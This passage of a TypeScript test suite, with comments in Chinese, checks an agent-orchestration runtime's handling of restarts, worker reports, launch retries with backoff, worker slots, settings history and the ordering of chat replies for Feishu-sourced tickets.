  expect(await put({ ...config, delivery: 'z'.repeat(bytes) })).toMatchObject({ status: 400, body: { error: `Request exceeds ${bytes} bytes` } })
  expect(h.restarts).not.toHaveBeenCalled()
})

it('releases the database and the state directory lock when it fails to start, so it can start again in this process', async () => {
  await h.runtime.stop()
  const db = new DatabaseSync(join(h.directory, 'orchestrator.sqlite'))
  db.prepare("UPDATE kv SET value='99' WHERE key='schema'").run()
  db.close()
  const context = () => { const ctx = new Context(); for (const [name, service] of Object.entries(h.services)) ctx.reflect.provide(name, service); return ctx }
  expect(() => new Runtime(context(), testMachine({ stateDir: h.directory }), vi.fn())).toThrow('Unsupported orchestrator database version 99')
  const fixed = new DatabaseSync(join(h.directory, 'orchestrator.sqlite'))
  fixed.prepare('UPDATE kv SET value=? WHERE key=?').run(String(SCHEMA_VERSION), 'schema')
  fixed.close()
  // 失败启动保留下来的锁会让这里抛出锁已被持有。
  h.runtime = new Runtime(context(), testMachine({ stateDir: h.directory }), vi.fn())
  await h.runtime.ready
  expect(h.runtime.store.get(KV.store.schema)).toBe(SCHEMA_VERSION)
})

it('restarts a worker that was mid-work when the host stopped with the recovery note, and records no end of its turn', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'halfway' })
  // 停止会取消 worker 的回合：它进入空闲并将中止作为错误报告，而正在停止的宿主会将其视为没有结束。
  const agent = h.agents.get(sessionId)! as { status: string; cancel: ReturnType<typeof vi.fn> }
  const stopping = (h.runtime as unknown as { ctx: Context }).ctx
  agent.cancel.mockImplementation(() => {
    agent.status = 'idle'
    stopping.emit('agent/status', { agent, status: 'idle' } as never)
    stopping.emit('agent/error', { agent, turn: 1, step: 1, error: Object.assign(new Error('The operation was aborted'), { name: 'AbortError' }) } as never)
  })
  const next = await restart()
  await next.ready
  const recovered = next.store.tickets.get(ticket.id)!
  expect(recovered.assignments.map(item => item.state)).toEqual(['ended', expect.stringMatching(/^(pending|running)$/)])
  expect(recovered.assignments[0]!.report).toMatchObject({ state: 'progress', summary: 'halfway' })
  expect(recovered.assignments.flatMap(item => item.report ? [item.report.state] : [])).toEqual(['progress'])
  expect(recovered.inputs).toEqual([expect.objectContaining({ kind: 'text', text: expect.stringContaining('host restarted') })])
})

it('keeps the report of a blocked, failed or ready worker whose turn ends, and relays nothing more', async () => {
  for (const state of ['blocked', 'failed', 'ready'] as const) {
    const { ticket, sessionId } = await acceptedTicket(feishu(String(20 + ['blocked', 'failed', 'ready'].indexOf(state)), `@bot 修 ${state}`, { root_id: undefined }))
    await runTool(sessionId, 'orchestrator_report', { state, summary: `${state} report` })
    const relayed = relays(h.runtime.masterId).length
    const agent = h.agents.get(sessionId)! as { status: string }
    agent.status = 'idle'
    ;(h.runtime as unknown as { ctx: Context }).ctx.emit('agent/status', { agent, status: 'idle' } as never)
    await h.runtime.idle()
    expect(h.runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state, summary: `${state} report` })
    expect(relays(h.runtime.masterId)).toHaveLength(relayed)
  }
})

it('relays the status-request hint when a worker\'s turn ends with no text and no report', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  const agent = h.agents.get(sessionId)! as { status: string }
  agent.status = 'idle'
  ;(h.runtime as unknown as { ctx: Context }).ctx.emit('agent/status', { agent, status: 'idle' } as never)
  await vi.waitFor(() => expect(h.runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'waiting' }))
  expect(relays(h.runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_report', ticket: { ticket_id: ticket.id }, state: 'waiting',
    summary: expect.stringContaining('orchestrator_ticket_request_status') })
})

it('fails a ticket at once on a worker error that is not passing, and relays it', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  ;(h.runtime as unknown as { ctx: Context }).ctx.emit('agent/error', { agent: h.agents.get(sessionId), turn: 1, step: 1, error: new Error('Invalid tool schema') } as never)
  await vi.waitFor(() => expect(h.runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed', summary: expect.stringContaining('Invalid tool schema') }))
  expect(relays(h.runtime.masterId).at(-1)).toMatchObject({ kind: 'worker_report', ticket: { ticket_id: ticket.id }, state: 'failed' })
})

it('runs a launch that fails for a passing reason again on the launch backoff three times, then fails its ticket; a failed prepare fails at once', async () => {
  const original = h.controller.resolveAgent.getMockImplementation()! as (id: string) => Promise<unknown>
  const later = async (now: number) => {
    vi.useFakeTimers({ toFake: ['Date'], now })
    try { await h.runtime.pump(); await h.runtime.idle() } finally { vi.useRealTimers() }
  }
  for (const [index, error] of [Object.assign(new Error('Service Unavailable'), { status: 503 }), Object.assign(new Error('read ECONNRESET'), { code: 'ECONNRESET' })].entries()) {
    let tries = 0
    h.controller.resolveAgent.mockImplementation(async (id: string) => {
      if (String(id).startsWith('worker-')) { tries++; throw error }
      return original(id)
    })
    const { ticket } = await acceptedTicket(feishu(String(30 + index), `@bot 修 ${index}`, { root_id: undefined }))
    await h.runtime.idle()
    let now = Date.now()
    for (let attempt = 0; attempt < 3; attempt++) {
      expect(h.runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toBeUndefined()
      now += 5000 * 2 ** attempt + 1000
      await later(now)
    }
    expect(tries).toBe(4)
    expect(h.runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed' })
    h.controller.resolveAgent.mockImplementation(original)
  }
  // 输出点名通过类失败结果的 prepare 命令不会自行再次运行。
  const runs = () => subprocess.spawn.mock.calls.filter(([spec]) => (spec as { argv: string[] }).argv[0] === shellArgv('')[0]).length
  h.runtime.store.saveSettings({ ...h.runtime.store.settings(), executor: { ...h.runtime.store.settings().executor, prepare: 'exit 3' } })
  h.answers[shellArgv('exit 3').join(' ')] = new Error('fatal: unable to access: The requested URL returned error: 503')
  const before = runs()
  // 新工单有自己的子目录，因此它一定会运行 prepare 命令，不会复用前面工单准备好的工作区。
  const prepared = await acceptedTicket(feishu('40', '@bot 修 prepare', { root_id: undefined }))
  await h.runtime.idle()
  expect(h.runtime.store.tickets.get(prepared.ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed', summary: expect.stringContaining('503') })
  expect(runs()).toBe(before + 1)
  // 重试会再次运行 prepare 命令，因为它留下的空目录已被删除；恢复不会重新启动失败的启动。
  delete h.answers[shellArgv('exit 3').join(' ')]
  h.runtime.executor.resume()
  await h.runtime.idle()
  expect(runs()).toBe(before + 1)
  h.runtime.engine.retryTicket(prepared.ticket.id)
  await h.runtime.idle()
  expect(runs()).toBe(before + 2)
  expect(h.runtime.store.tickets.get(prepared.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'running' })
})

it('launches a queued Assignment once when the host resumes, and gives a failed launch\'s slot back', async () => {
  h.runtime.store.saveSettings({ ...h.runtime.store.settings(), executor: { ...h.runtime.store.settings().executor, maxWorkers: 1, prepare: 'exit 3' } })
  h.answers[shellArgv('exit 3').join(' ')] = new Error('fatal: no such clone')
  const failed = await acceptedTicket(feishu('50', '@bot 修 一', { root_id: undefined }))
  await h.runtime.idle()
  expect(h.runtime.store.tickets.get(failed.ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed' })
  // 失败的启动不占用槽位：下一个工单会在唯一的槽位中启动。
  delete h.answers[shellArgv('exit 3').join(' ')]
  const next = await acceptedTicket(feishu('51', '@bot 修 二', { root_id: undefined }))
  await h.runtime.idle()
  expect(h.runtime.store.tickets.get(next.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'running' })
  // 第三个会等待槽位；恢复会再次排队其启动，一旦槽位空闲就会运行。
  const queued = await acceptedTicket(feishu('52', '@bot 修 三', { root_id: undefined }))
  await h.runtime.idle()
  expect(h.runtime.store.tickets.get(queued.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'pending' })
  h.runtime.executor.resume(); h.runtime.executor.resume()
  const launches = () => h.deliveries.mock.calls.filter(([call]) => call.sessionId === queued.sessionId).length
  ;(h.agents.get(next.sessionId)! as { status: string }).status = 'idle'
  await h.runtime.pump(); await h.runtime.idle()
  await vi.waitFor(() => expect(h.runtime.store.tickets.get(queued.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'running' }))
  expect(launches()).toBe(1)
})

it('shows the settings history when one revision holds values its Source kind no longer accepts, without that revision\'s changes', async () => {
  const settings = h.runtime.store.settings()
  await h.runtime.settings.save('executor', { ...settings.executor, maxWorkers: 4 }, h.runtime.store.blockRevision('executor'), 'panel')
  await h.runtime.settings.save('executor', { ...h.runtime.store.settings().executor, maxWorkers: 5 }, h.runtime.store.blockRevision('executor'), 'panel')
  // 迁移留下一个按早期版本写入的修订版本，飞书类型的 schema 会拒绝它。
  const revision = h.runtime.store.get(KV.settings.revision)!
  const stored = h.runtime.store.get(KV.settings.version(revision - 1))!
  h.runtime.store.set(KV.settings.version(revision - 1), { ...stored, settings: { ...stored.settings,
    sources: { ...stored.settings.sources, feishu: { kind: 'feishu', name: '飞书', enabled: true, config: { readPageSize: 'many' } } } } })
  const history = policyHistory(h.runtime.store, h.runtime.sources, policyVersion(h.runtime.store.settings()))
  expect(history.items.slice(0, 2)).toEqual([expect.objectContaining({ revision, changes: null }), expect.objectContaining({ revision: revision - 1, changes: null })])
  expect(history.items[2]).toMatchObject({ revision: revision - 2 })
})

it('restarts a worker whose shell job the host stop ended with the recovery note, as a worker mid-work', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  await runTool(sessionId, 'orchestrator_report', { state: 'progress', summary: 'running the tests' })
  // 其回合以后台测试运行结束，因此它忙碌，而不是等待。
  h.jobs.run(sessionId)
  const agent = h.agents.get(sessionId)! as { status: string }
  agent.status = 'idle'
  ;(h.runtime as unknown as { ctx: Context }).ctx.emit('agent/status', { agent, status: 'idle' } as never)
  await h.runtime.idle()
  expect(h.runtime.store.tickets.get(ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'progress' })
  // 宿主停止，其任务也随之结束。
  h.jobs = jobRegistry(); h.services.jobs = h.jobs.service
  const next = await restart()
  await next.ready
  const recovered = next.store.tickets.get(ticket.id)!
  expect(recovered.assignments.map(item => item.state)).toEqual(['ended', expect.stringMatching(/^(pending|running)$/)])
  expect(recovered.inputs).toEqual([expect.objectContaining({ kind: 'text', text: expect.stringContaining('host restarted') })])
})

it('gives the Assignment a restart starts the messages the replaced one had delivered but no step took, once', async () => {
  const { ticket, sessionId } = await acceptedTicket()
  // 后续消息在回合中途到达 worker，而进程在某个步骤取走它之前停止：DSH 会连同其收件箱一起
  // 处置 worker 的智能体。
  await receive(feishu('2', '另外改一下按钮', { root_id: 'om_1' }))
  const sent = () => h.deliveries.mock.calls.filter(([call]) => call.sessionId === sessionId && call.text.includes('另外改一下按钮')).length
  expect(sent()).toBe(1)
  const inbox = (h.agents.get(sessionId)! as unknown as { inbox: { nextTurn: unknown[]; nextStep: unknown[] } }).inbox
  inbox.nextTurn.length = 0; inbox.nextStep.length = 0
  const next = await restart()
  await next.ready; await next.idle()
  expect(next.store.tickets.get(ticket.id)!.assignments.map(item => item.state)).toEqual(['ended', 'running'])
  expect(sent()).toBe(2)
})

describe('the order of a Ticket\'s messages to one conversation', () => {
  const sent: string[] = []
  const refused = new Set<string>()
  const message = (id: string, ticketId: string, channel = feishuChannel('feishu', CHAT, 'om_1')) => ({ id, channel, text: id, kind: 'reply' as const, ticketId })
  const at = async (ms: number) => {
    vi.useFakeTimers({ toFake: ['Date'], now: Date.now() + ms })
    try { await h.runtime.sendReplies() } finally { vi.useRealTimers() }
  }
  beforeEach(async () => {
    sent.length = 0; refused.clear()
    await acceptedTicket()
    vi.spyOn(h.runtime.sources, 'send').mockImplementation(async message => {
      if (refused.has(message.id)) throw new Error('internal error (2200)')
      sent.push(message.id)
      return 'sent'
    })
  })
  it('sends a Ticket\'s later result after its acknowledgement that failed once, and holds no other Ticket\'s message in the chat', async () => {
    refused.add('ack-a')
    h.runtime.outbox.send(message('ack-a', 'a'))
    await h.runtime.sendReplies()
    refused.delete('ack-a')
    h.runtime.outbox.send(message('result-a', 'a'))
    // 同一聊天中的另一个工单是其他订单。
    h.runtime.outbox.send(message('ack-b', 'b', feishuChannel('feishu', CHAT, 'om_2')))
    await h.runtime.sendReplies()
    expect([h.runtime.outbox.status('result-a'), sent]).toEqual(['pending', ['ack-b']])
    await at(5000)
    expect(sent).toEqual(['ack-b', 'ack-a', 'result-a'])
  })
  it('stops holding a Ticket\'s later messages behind one that failed three times, which the overview shows', async () => {
    refused.add('ack-a')
    h.runtime.outbox.send(message('ack-a', 'a'))
    await h.runtime.sendReplies()
    h.runtime.outbox.send(message('result-a', 'a'))
    // 其重试会在 5 秒后、再 10 秒后进行；第三次失败会释放结果。
    await at(5000)
    expect(sent).toEqual([])
    await at(15_000)
    expect(sent).toEqual(['result-a'])
    expect(overviewOf(h.runtime).problems).toContainEqual({ kind: 'outgoing', outgoing: expect.objectContaining({ id: 'ack-a', attempts: 3 }) })
  })
})
